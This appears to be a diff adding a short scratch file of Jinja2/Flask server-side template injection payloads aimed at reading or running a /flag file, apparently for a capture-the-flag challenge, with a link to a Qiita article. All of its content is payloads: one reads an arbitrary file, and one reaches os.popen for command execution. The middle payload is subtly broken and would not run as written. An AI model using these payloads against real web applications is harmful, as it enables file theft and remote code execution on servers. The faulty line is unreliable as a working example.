@@ -1,0 +1,5 @@
+https://qiita.com/koki-sato/items/6ff94197cf96d50b5d8f
+
+{{open('/flag').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').open('/flag', os.O_WRONLY).read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('/flag').read()}}
